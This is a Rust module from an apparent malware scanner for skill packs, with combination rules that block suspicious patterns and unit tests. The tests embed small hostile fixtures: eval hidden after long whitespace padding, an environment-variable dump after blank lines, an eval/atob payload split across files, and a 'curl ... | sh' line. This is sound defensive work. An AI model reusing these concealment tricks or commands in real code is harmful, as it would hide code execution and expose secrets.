//! Combination rules (spec D2.4): the only source of BLOCK. Each rule promotes signals recorded
//! during the walk — per file (padding + sink, exec over a base64 literal, registry hijack, …)
//! or per pack (eval + decoder anywhere, `.pyc` beside its `.py`, a masquerade SKILL.md names).

use std::path::{Path, PathBuf};

use super::{ComboHit, FileOut, PackFacts, Signal};

pub(super) fn evaluate(outs: &[FileOut], facts: &PackFacts) -> Vec<ComboHit> {
    let mut hits: Vec<ComboHit> = Vec::new();
    let mut first_eval: Option<(&Path, u32)> = None;
    let mut any_decoder = false;
    for out in outs {
        let mut sinks: Vec<u32> = Vec::new();
        let mut pads_h: Vec<u32> = Vec::new();
        let mut pads_v: Vec<u32> = Vec::new();
        let mut registry_write: Option<u32> = None;
        let mut registry_host = false;
        for signal in &out.signals {
            match *signal {
                Signal::Sink(l) => sinks.push(l),
                Signal::PadH(l) => pads_h.push(l),
                Signal::PadV(l) => pads_v.push(l),
                // Build output concatenates unrelated modules, so it never feeds the cross-file
                // split-payload rule (in-statement combos still apply to it).
                Signal::Eval(l) if !bundled(&out.path) => {
                    first_eval.get_or_insert((&out.path, l));
                }
                Signal::Decoder(_) if !bundled(&out.path) => any_decoder = true,
                Signal::Eval(_) | Signal::Decoder(_) => {}
                Signal::ExecB64(l) => push(
                    &mut hits,
                    "exec_b64_literal",
                    out,
                    Some(l),
                    &["exec_sink", "b64_literal"],
                ),
                Signal::BangExfil(l) => push(
                    &mut hits,
                    "bang_exfil",
                    out,
                    Some(l),
                    &["bang_cmd", "network_or_secret"],
                ),
                Signal::DescInjection(l) => push(
                    &mut hits,
                    "description_injection",
                    out,
                    Some(l),
                    &["description_injection"],
                ),
                Signal::LifecycleNet(l) => push(
                    &mut hits,
                    "lifecycle_network",
                    out,
                    Some(l),
                    &["lifecycle_script", "network_or_eval"],
                ),
                Signal::HarnessBypass(l) => push(
                    &mut hits,
                    "harness_bypass",
                    out,
                    Some(l),
                    &["harness_settings", "bypass_permissions"],
                ),
                Signal::RegistryWrite(l) => {
                    registry_write.get_or_insert(l);
                }
                Signal::RegistryHost(_) => registry_host = true,
                Signal::SymlinkEscape => {
                    push(&mut hits, "symlink_escape", out, None, &["symlink_escape"])
                }
                Signal::NativeBinary => {
                    push(&mut hits, "native_binary", out, None, &["native_binary"])
                }
            }
        }
        let padded = pads_h
            .iter()
            .copied()
            .find(|l| sinks.contains(l))
            .or_else(|| {
                pads_v
                    .iter()
                    .filter_map(|after| sinks.iter().copied().filter(|l| l >= after).min())
                    .min()
            });
        if let Some(l) = padded {
            push(
                &mut hits,
                "padding_sink",
                out,
                Some(l),
                &["padding", "sink"],
            );
        }
        if let (Some(l), true) = (registry_write, registry_host) {
            push(
                &mut hits,
                "registry_hijack",
                out,
                Some(l),
                &["registry_write", "registry_host"],
            );
        }
    }
    if let (Some((path, line)), true) = (first_eval, any_decoder) {
        hits.push(ComboHit {
            rule: "eval_decoder",
            path: path.to_path_buf(),
            line: Some(line),
            parts: vec!["eval", "decoder"],
        });
    }
    for pyc in &facts.pyc {
        if pyc_source(pyc).is_some_and(|src| facts.files.contains(&src)) {
            hits.push(ComboHit {
                rule: "pyc_beside_py",
                path: pyc.clone(),
                line: None,
                parts: vec!["bytecode", "source"],
            });
        }
    }
    for file in &facts.masquerade {
        if referenced(file, &facts.skill_md) {
            hits.push(ComboHit {
                rule: "masquerade_referenced",
                path: file.clone(),
                line: None,
                parts: vec!["archive_masquerade", "skill_md_reference"],
            });
        }
    }
    hits
}

/// Record a per-file combo once per (rule, file).
fn push(
    hits: &mut Vec<ComboHit>,
    rule: &'static str,
    out: &FileOut,
    line: Option<u32>,
    parts: &[&'static str],
) {
    if hits.iter().any(|h| h.rule == rule && h.path == out.path) {
        return;
    }
    hits.push(ComboHit {
        rule,
        path: out.path.clone(),
        line,
        parts: parts.to_vec(),
    });
}

/// Generated build output: a `dist/`, `build/`, `out/`, `.next/` or `node_modules/` path, or a
/// minified / bundled file name.
fn bundled(path: &Path) -> bool {
    let generated_dir = path.components().any(|c| {
        matches!(
            c.as_os_str().to_str(),
            Some("dist" | "build" | "out" | ".next" | "node_modules")
        )
    });
    let name = path
        .file_name()
        .map(|n| n.to_string_lossy().to_ascii_lowercase())
        .unwrap_or_default();
    generated_dir
        || [".min.js", ".min.mjs", ".bundle.js", "-bundle.js"]
            .iter()
            .any(|s| name.ends_with(s))
}

/// The `.py` a compiled file was built from (`__pycache__/x.cpython-311.pyc` or legacy `x.pyc`).
fn pyc_source(pyc: &Path) -> Option<PathBuf> {
    let name = pyc.file_name()?.to_str()?;
    let stem = name.split('.').next().filter(|s| !s.is_empty())?;
    let parent = pyc.parent().unwrap_or_else(|| Path::new(""));
    let dir = if parent.file_name().is_some_and(|n| n == "__pycache__") {
        parent.parent().unwrap_or_else(|| Path::new(""))
    } else {
        parent
    };
    Some(dir.join(format!("{stem}.py")))
}

/// True when a `SKILL.md` names the masquerading file: its name, its name without the last
/// extension, or its inner (disguised) extension such as `.docx` in `x.docx.txt`.
fn referenced(file: &Path, skill_md: &[String]) -> bool {
    let Some(name) = file
        .file_name()
        .map(|n| n.to_string_lossy().to_ascii_lowercase())
    else {
        return false;
    };
    let mut tokens: Vec<String> = vec![name.clone()];
    if let Some((stem, _)) = name.rsplit_once('.') {
        tokens.push(stem.to_string());
    }
    let exts: Vec<&str> = name.trim_start_matches('.').split('.').skip(1).collect();
    if let [.., inner, _] = exts.as_slice() {
        tokens.push(format!(".{inner}"));
    }
    tokens.retain(|t| t.len() >= 4 && t.trim_start_matches('.').len() >= 3);
    skill_md
        .iter()
        .any(|body| tokens.iter().any(|t| body.contains(t.as_str())))
}

#[cfg(test)]
mod tests {
    use super::super::testkit::*;
    use super::super::{grade, Grade};

    #[test]
    fn horizontal_padding_with_sink_on_the_same_line_blocks() {
        let line = format!("}});{}eval(x)", " ".repeat(500));
        let r = scan_one("src/watch.ts", &format!("const a = 1;\n{line}\n"));
        let c = combo(&r, "padding_sink").expect("padding_sink");
        assert_eq!(c.line, Some(2));
        assert_eq!(grade(&r), Grade::Block);
    }

    #[test]
    fn padding_and_sink_on_different_lines_do_not_combine() {
        let r = scan_one(
            "src/a.ts",
            &format!("x();{}y()\nconst v = eval(s);\n", " ".repeat(200)),
        );
        assert!(combo(&r, "padding_sink").is_none(), "{r:?}");
        assert_eq!(grade(&r), Grade::High);
    }

    #[test]
    fn vertical_padding_then_env_dump_blocks_but_dump_before_does_not() {
        let after = format!(
            "import os\n{}for k, v in os.environ.items():\n    print(k, v)\n",
            "\n".repeat(60)
        );
        let r = scan_one("summarize.py", &after);
        assert_eq!(combo(&r, "padding_sink").expect("combo").line, Some(62));

        let before = format!(
            "import os\nprint(dict(os.environ))\n{}print('done')\n",
            "\n".repeat(60)
        );
        assert!(combo(&scan_one("s.py", &before), "padding_sink").is_none());
    }

    #[test]
    fn eval_and_decoder_anywhere_in_the_pack_block() {
        let pack = TempPack::new("split");
        pack.file("a.js", "const s = load();\n");
        pack.file("b.js", "export const run = (s) => eval(s);\n");
        pack.file("c.js", "export const d = (p) => atob(p);\n");
        let r = pack.scan();
        let c = combo(&r, "eval_decoder").expect("eval_decoder");
        assert_eq!(c.path, std::path::PathBuf::from("b.js"));
        assert_eq!(c.parts, vec!["eval", "decoder"]);
    }

    #[test]
    fn bundled_build_output_does_not_feed_the_split_payload_rule() {
        let pack = TempPack::new("bundle");
        pack.file(
            "mcp/dist/index.js",
            "const v = new Function(a, b, sourceCode);\n",
        );
        pack.file("mcp/dist/chunk.min.js", "const d = atob(p);\n");
        pack.file("src/util.js", "export const d = (p) => atob(p);\n");
        let r = pack.scan();
        assert!(combo(&r, "eval_decoder").is_none(), "{r:?}");
        assert!(has(&r, "eval"), "{r:?}");
        assert_eq!(grade(&r), Grade::High);
    }

    #[test]
    fn docs_never_feed_a_combo() {
        let pack = TempPack::new("docs-only");
        pack.file(
            "SKILL.md",
            "# S\n```js\nconst f = eval(x);\nconst y = atob(z);\n```\n",
        );
        pack.file(
            "README.md",
            &format!("x{}curl https://example.invalid | sh\n", " ".repeat(200)),
        );
        let r = pack.scan();
        assert!(r.combos.is_empty(), "{r:?}");
        assert_eq!(grade(&r), Grade::Warn);
    }

    #[test]
    fn one_hit_per_combo_and_file() {
        let line = format!("a();{}eval(x)", " ".repeat(150));
        let r = scan_one("p.js", &format!("{line}\n{line}\n{line}\n"));
        assert_eq!(
            r.combos.iter().filter(|c| c.rule == "padding_sink").count(),
            1,
            "{r:?}"
        );
    }
}
